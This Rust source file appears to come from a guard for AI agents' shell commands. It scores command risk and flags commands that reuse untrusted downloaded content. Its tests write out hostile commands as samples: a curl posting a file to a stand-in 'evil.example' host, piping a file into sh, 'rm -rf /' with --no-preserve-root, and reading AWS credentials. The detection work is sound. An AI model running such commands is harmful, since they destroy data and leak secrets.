//! The deterministic, dependency-free scorer.
//!
//! Always available, sub-microsecond, and the graceful-degradation path when no
//! GGUF model is present. It produces an honest one-line summary from the Tier-1
//! rule id and a severity score from the class plus signal words in the command.
//! It never sees a catastrophic command in the decision path (the daemon only
//! scores the ambiguous band), but it can summarize one for the hold card.
//!
//! It also owns the advisory **dependency hint** (Phase 6 V1.1, hardening item
//! H): a deterministic, I/O-free answer to "does this command plausibly consume
//! content the session already holds from an untrusted source?" — see
//! [`DependencyHint`].

use kintsugi_core::{Class, ProposedCommand, TaintSet};

use crate::{ModelOutput, Scorer};

/// A fixed scoring backend with no external dependencies.
#[derive(Debug, Default, Clone)]
pub struct HeuristicScorer;

impl HeuristicScorer {
    pub fn new() -> Self {
        Self
    }
}

impl Scorer for HeuristicScorer {
    fn name(&self) -> &str {
        "heuristic"
    }

    fn score(&self, cmd: &ProposedCommand, class: Class, rule: &str) -> ModelOutput {
        ModelOutput {
            summary: summarize(&cmd.raw, class, rule),
            risk: risk_for(&cmd.raw, class),
        }
    }

    fn score_with_hint(
        &self,
        cmd: &ProposedCommand,
        class: Class,
        rule: &str,
        hint: DependencyHint,
    ) -> ModelOutput {
        let mut out = self.score(cmd, class, rule);
        match hint {
            // Text-only and hedged on purpose: independence can't be proven
            // (poisoned content can ride a file whose name reveals nothing),
            // so this is an observation for the human reading the hold card,
            // never an assurance — and never a decision input.
            DependencyHint::LikelyIndependent => out
                .summary
                .push_str(" It does not appear to reference the session's untrusted content."),
            // The Dependent escalation is the daemon's to apply (and to mark in
            // the reason with `advisory:`); the scorer's own output is unchanged
            // so the hint can never move a risk threshold by itself.
            DependencyHint::LikelyDependent | DependencyHint::Unknown => {}
        }
        out
    }
}

/// The advisory dependency hint for the ambiguous taint band (hardening item H).
///
/// Deterministic, I/O-free, escalation-only. It answers ONE question, coarsely:
/// does this command plausibly *consume* content the session already holds from
/// an untrusted source? The exact signals:
///
/// - **LikelyDependent** — the command's raw text references an identifier from
///   the session's untrusted trail: some taint label's `source_id` (a URL, a
///   file path, a normalized MCP tool id) appears in the command. One substring
///   rule covers every shape of reference — re-fetching a poisoned URL, piping
///   or redirecting a tainted *path* (`cat /tmp/x | sh`), passing it through the
///   environment or as a curl-style `@file` operand (`FOO=@/tmp/x`, `-d @/tmp/x`),
///   and re-invoking an MCP source by id.
/// - **LikelyIndependent** — the command names at least one file-ish/URL-ish
///   operand, but none of them matches any trail identifier. Deliberately weak:
///   downstream content can be poisoned without naming its origin, so this NEVER
///   unlocks anything — the daemon renders it as text only.
/// - **Unknown** — the command has no recognizable file/URL operand (or the
///   trail is empty), so there is nothing positive to say either way.
///
/// Matching caveats, stated honestly: trail identifiers are stored **already
/// redacted** at the daemon's single ingest boundary (segment G), so a command
/// naming the *un-redacted* form of a redacted URL can miss; matching is exact
/// substring, case-sensitive; an empty `source_id` never matches anything. Every
/// miss errs toward silence — it can only cost caution the hint would have
/// *added*, never weaken the deterministic floor or the base rules (spine #2:
/// where the model affects a decision it may only add caution).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DependencyHint {
    /// The command references an identifier from the session's untrusted trail.
    LikelyDependent,
    /// The command names files/URLs, none from the trail. Text-only — it never
    /// changes a decision.
    LikelyIndependent,
    /// Nothing positive to say either way.
    Unknown,
}

/// Compute the advisory dependency hint of a command against a session's
/// untrusted trail. Pure: no I/O, no clock, no model — just string matching
/// against identifiers that are already secret-free by construction.
pub fn dependency_hint(cmd: &ProposedCommand, trail: &TaintSet) -> DependencyHint {
    if !trail.is_tainted() {
        return DependencyHint::Unknown;
    }
    // Dependent: any untrusted identifier is an operand of this command.
    if trail
        .labels()
        .iter()
        .any(|l| !l.source_id.is_empty() && cmd.raw.contains(l.source_id.as_str()))
    {
        return DependencyHint::LikelyDependent;
    }
    // Independent: the command names files/URLs, none of them from the trail.
    if kintsugi_core::shell::split(&cmd.raw)
        .iter()
        .any(|t| names_file_or_url(t))
    {
        return DependencyHint::LikelyIndependent;
    }
    DependencyHint::Unknown
}

/// A loose "this token names a file or URL" test — deliberately cheap and
/// over-inclusive, because its only consumer is a hint where a wrong
/// `LikelyIndependent` costs nothing (the hint is text-only).
fn names_file_or_url(tok: &str) -> bool {
    // Curl-style `@file` operands name the file after the `@`.
    let t = tok.trim_start_matches('@');
    t.contains("://")
        || t.starts_with('/')
        || t.starts_with("./")
        || t.starts_with("../")
        || t.starts_with('~')
        || t.starts_with('\\')
        || is_windows_drive(t)
}

/// `C:\…` style Windows drive paths.
fn is_windows_drive(t: &str) -> bool {
    let b = t.as_bytes();
    b.len() >= 2 && b[0].is_ascii_alphabetic() && b[1] == b':'
}

/// One plain-English sentence about the command.
fn summarize(raw: &str, class: Class, rule: &str) -> String {
    let prog = raw.split_whitespace().next().unwrap_or("the command");
    let detail = friendly(rule);
    match class {
        Class::Safe => format!("Runs `{prog}` — a read-only or build/test command."),
        Class::Ambiguous => {
            if detail.is_empty() {
                format!("Runs `{prog}`; effects are unclear, so it needs your call.")
            } else {
                format!("Runs `{prog}` — {detail}")
            }
        }
        Class::Catastrophic => {
            if detail.is_empty() {
                format!("`{prog}` is destructive and may be irreversible.")
            } else {
                format!("{detail} This is hard or impossible to undo.")
            }
        }
    }
}

/// A severity score 0..=100, anchored by class and nudged by signal words.
fn risk_for(raw: &str, class: Class) -> u8 {
    let base: i32 = match class {
        Class::Safe => 5,
        Class::Ambiguous => 45,
        Class::Catastrophic => 95,
    };
    let lower = raw.to_lowercase();
    let mut score = base;
    // Words that signal blast radius / irreversibility.
    for (needle, bump) in [
        ("--force", 15),
        ("-f", 8),
        ("--hard", 15),
        ("-rf", 20),
        ("-r ", 8),
        ("prod", 20),
        ("production", 20),
        ("--all", 12),
        ("-a ", 6),
        ("/", 4),
        ("sudo", 10),
        ("--no-preserve-root", 25),
        ("drop ", 20),
        ("delete", 12),
        ("destroy", 20),
    ] {
        if lower.contains(needle) {
            score += bump;
        }
    }
    score.clamp(0, 100) as u8
}

/// Short human phrase for a rule id (kept terse for a one-line summary).
fn friendly(rule: &str) -> &'static str {
    match rule.split_whitespace().next().unwrap_or(rule) {
        "rm:recursive" => "recursively deletes files and directories.",
        "rm:force-root" => "force-deletes a top-level path.",
        "git:force-push" => "force-pushes, overwriting remote history.",
        "git:reset-hard" => "discards local commits and changes.",
        "git:clean" => "deletes untracked files.",
        "git:history-rewrite" => "rewrites git history.",
        "git:branch-delete" => "force-deletes a branch.",
        "terraform:destroy" => "tears down infrastructure.",
        "kubectl:delete" => "deletes Kubernetes resources.",
        "helm:uninstall" => "uninstalls a release.",
        "sql:destructive" | "sql:truncate" => "runs destructive SQL.",
        "dd:write" | "disk:destructive" | "disk:mkfs" | "disk:block-device-write" => {
            "writes directly to a disk or device."
        }
        "secret:read" => "reads a secret or credential file.",
        "net:pipe-to-shell" => "pipes a download straight into a shell.",
        "docker:system-prune" | "docker:volume-destroy" => "destroys Docker data.",
        "forkbomb" => "is a fork bomb that will exhaust the system.",
        _ => "",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cmd(raw: &str) -> ProposedCommand {
        ProposedCommand::new("t", "/tmp", vec![raw.into()], raw)
    }

    #[test]
    fn safe_is_low_risk() {
        let out = HeuristicScorer::new().score(&cmd("ls -la"), Class::Safe, "safe:ls");
        assert!(out.risk < 20);
        assert!(out.summary.contains("read-only") || out.summary.contains("build"));
    }

    #[test]
    fn catastrophic_is_high_risk_and_explained() {
        let out =
            HeuristicScorer::new().score(&cmd("rm -rf /"), Class::Catastrophic, "rm:recursive");
        assert!(out.risk >= 95);
        assert!(out.summary.to_lowercase().contains("undo") || out.summary.contains("delete"));
    }

    #[test]
    fn ambiguous_signal_words_raise_score() {
        let plain =
            HeuristicScorer::new().score(&cmd("make build"), Class::Ambiguous, "ambiguous:make");
        let prod = HeuristicScorer::new().score(
            &cmd("./deploy.sh --force production"),
            Class::Ambiguous,
            "ambiguous:deploy.sh",
        );
        assert!(prod.risk > plain.risk, "prod/force should score higher");
        assert!(prod.risk <= 100);
    }

    #[test]
    fn risk_is_always_in_range() {
        let out = HeuristicScorer::new().score(
            &cmd("sudo rm -rf / --no-preserve-root --force production drop destroy"),
            Class::Catastrophic,
            "rm:recursive",
        );
        assert!(out.risk <= 100);
    }

    // ---- Advisory dependency hint (Phase 6 V1.1 · hardening item H) -----------

    /// A trail of untrusted labels, built the same way the live interception
    /// path builds them (`ObservedIngest::now` → `into_taint_event`), so no
    /// fixture type is invented here and no extra dev-dependency is needed.
    fn trail(ids: &[&str]) -> kintsugi_core::TaintSet {
        use kintsugi_core::{ObservedIngest, SourceKind, TaintEvent, TaintSet};
        let mut set = TaintSet::default();
        for id in ids {
            if let TaintEvent::Ingest { label } =
                ObservedIngest::now(SourceKind::Download, *id, "t", "s", "/w").into_taint_event()
            {
                set.add(label);
            }
        }
        set
    }

    fn hint_for(raw: &str, ids: &[&str]) -> DependencyHint {
        dependency_hint(&cmd(raw), &trail(ids))
    }

    #[test]
    fn a_clean_trail_never_hints() {
        assert_eq!(hint_for("curl -s https://x", &[]), DependencyHint::Unknown);
    }

    #[test]
    fn referencing_a_tainted_identifier_is_likely_dependent() {
        // Re-fetching the poisoned page…
        assert_eq!(
            hint_for(
                "curl -s https://untrusted.example/page",
                &["https://untrusted.example/page"]
            ),
            DependencyHint::LikelyDependent
        );
        // …piping a tainted path into a shell…
        assert_eq!(
            hint_for("cat /tmp/poisoned.html | sh", &["/tmp/poisoned.html"]),
            DependencyHint::LikelyDependent
        );
        // …passing it through the environment, or as an @file operand…
        assert_eq!(
            hint_for(
                "FOO=@/tmp/poisoned.html make build",
                &["/tmp/poisoned.html"]
            ),
            DependencyHint::LikelyDependent
        );
        assert_eq!(
            hint_for(
                "curl -d @/tmp/poisoned.html https://evil.example",
                &["/tmp/poisoned.html"]
            ),
            DependencyHint::LikelyDependent
        );
        // …and re-invoking an MCP source by its normalized id.
        assert_eq!(
            hint_for("mcp/github/get_issue run", &["mcp/github/get_issue"]),
            DependencyHint::LikelyDependent
        );
    }

    #[test]
    fn file_url_operands_outside_the_trail_are_likely_independent() {
        assert_eq!(
            hint_for("wc -l /tmp/other.log", &["https://untrusted.example/page"]),
            DependencyHint::LikelyIndependent
        );
        assert_eq!(
            hint_for(
                "echo ~/.aws/credentials",
                &["https://untrusted.example/page"]
            ),
            DependencyHint::LikelyIndependent
        );
    }

    #[test]
    fn no_operands_and_no_match_is_unknown() {
        assert_eq!(
            hint_for("make deploy", &["https://untrusted.example/page"]),
            DependencyHint::Unknown
        );
    }

    #[test]
    fn a_degenerate_empty_source_id_never_matches() {
        // `contains("")` is true for any command — an empty label must not turn
        // every command dependent.
        assert_eq!(hint_for("make deploy", &[""]), DependencyHint::Unknown);
    }

    #[test]
    fn a_redacted_id_may_miss_and_that_errs_toward_silence() {
        // Labels are stored redacted (segment G), so a command naming the
        // UN-redacted form of a redacted URL may not match. A miss can only
        // cost caution the hint would have added — the deterministic floor is
        // unaffected. Pinned so the trade-off stays explicit.
        assert_eq!(
            hint_for(
                "curl -s 'https://evil.example/p?api_key=sekrit'",
                &["https://evil.example/p?api_key=[redacted]"]
            ),
            DependencyHint::LikelyIndependent
        );
    }

    #[test]
    fn score_with_hint_annotates_independent_summaries_only() {
        use crate::Scorer;
        let s = HeuristicScorer::new();
        let c = cmd("echo ~/.aws/credentials");
        let plain = s.score(&c, Class::Ambiguous, "ambiguous:echo");
        let indep = s.score_with_hint(
            &c,
            Class::Ambiguous,
            "ambiguous:echo",
            DependencyHint::LikelyIndependent,
        );
        // Text-only: the decision inputs (summary semantics aside, the risk
        // number is what review surfaces) are untouched…
        assert_eq!(indep.risk, plain.risk);
        assert!(indep.summary.starts_with(&plain.summary));
        assert!(
            indep.summary.contains("does not appear"),
            "the note must be hedged observation, not assurance: {}",
            indep.summary
        );
        // …and the other outcomes change nothing in the scorer's output —
        // the Dependent escalation is the daemon's, marked in the reason.
        for hint in [DependencyHint::LikelyDependent, DependencyHint::Unknown] {
            assert_eq!(
                s.score_with_hint(&c, Class::Ambiguous, "ambiguous:echo", hint),
                plain,
                "hint {hint:?} must not alter the scorer output"
            );
        }
    }
}
